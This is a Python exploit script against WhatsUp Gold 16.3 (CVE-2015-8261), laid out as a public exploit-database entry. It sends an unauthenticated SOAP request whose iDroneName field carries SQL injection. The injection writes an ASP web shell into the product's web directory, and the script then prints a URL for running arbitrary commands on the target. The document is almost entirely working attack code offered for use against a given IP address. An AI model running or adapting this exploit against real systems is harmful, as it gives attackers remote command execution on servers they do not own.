#
# Exploit Title: WhatsUp Gold v16.3 Unauthenticated Remote Code Execution
# Date: 2016-01-13
# Exploit Author: Matt Buzanowski
# Vendor Homepage: http://www.ipswitch.com/
# Version: 16.3.x
# Tested on: Windows 7 x86
# CVE : CVE-2015-8261
# Usage: python DroneDeleteOldMeasurements.py <target ip>

import requests
import sys

ip_addr = sys.argv[1]

shell = '''<![CDATA[<% response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall() %>]]>'''

sqli_str = '''stuff'; END TRANSACTION; ATTACH DATABASE 'C:\\Program Files (x86)\\Ipswitch\\WhatsUp\\HTML\\NmConsole\\shell.asp' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('%s');--''' % shell

session = requests.Session()

headers = {"SOAPAction":"\"http://iDrone.alertfox.com/DroneDeleteOldMeasurements\"","User-Agent":"Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.4927)","Expect":"100-continue","Content-Type":"text/xml; charset=utf-8","Connection":"Keep-Alive"}

body = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <soap:Body>
    <DroneDeleteOldMeasurements xmlns="http://iDrone.alertfox.com/">
      <serializedDeleteOldMeasurementsRequest><?xml version="1.0" encoding="utf-16"?>
        <DeleteOldMeasurementsRequest xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
        <authorizationString>0123456789</authorizationString>
        <maxAgeInMinutes>1</maxAgeInMinutes>
        <iDroneName>%s</iDroneName>
        </DeleteOldMeasurementsRequest></serializedDeleteOldMeasurementsRequest>
    </DroneDeleteOldMeasurements>
  </soap:Body>
</soap:Envelope>""" % sqli_str

response = session.post("http://%s/iDrone/iDroneComAPI.asmx" % ip_addr,data=body,headers=headers)
print "Status code:", response.status_code
print "Response body:", response.content

print "\n\nSUCCESS!!! Browse to http://%s/NmConsole/shell.asp?cmd=whoami for unauthenticated RCE.\n\n" % ip_addr